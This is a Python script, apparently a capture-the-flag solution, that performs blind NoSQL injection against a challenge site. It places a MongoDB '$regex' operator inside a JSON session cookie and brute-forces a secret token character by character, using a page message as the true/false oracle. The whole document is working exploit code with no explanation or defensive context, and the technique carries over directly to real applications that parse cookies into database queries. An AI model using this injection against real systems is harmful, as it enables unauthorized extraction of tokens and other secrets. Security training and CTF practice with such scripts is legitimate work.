# Blind nosql using regex

import requests
import json
import re
import string
import time
url =  "https://area51.chall.pwnoh.io"
chars = string.ascii_letters + string.digits + "_" + string.punctuation

def blind_sqli(inject_template, sqli_oracle, chars = chars):
    val = ""
    while True:
        for c in chars:
            try:
                curr_val = val + c
                res = sqli_oracle(inject_template.format(curr_val))
                print(curr_val, res)
                if res:
                    val = curr_val
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(1)
                break
def oracle(inject):
	resp = requests.get(
		url,
		cookies={
		"session":
		json.dumps({
		"token": {
		"$regex": "^bctf\\{" + re.escape(inject)
		},
		"username": ""
		})
		}
	)
	return "We're working to make this site better! Come back later for an amazing Area51 experience" in resp.text
blind_sqli("{}", oracle)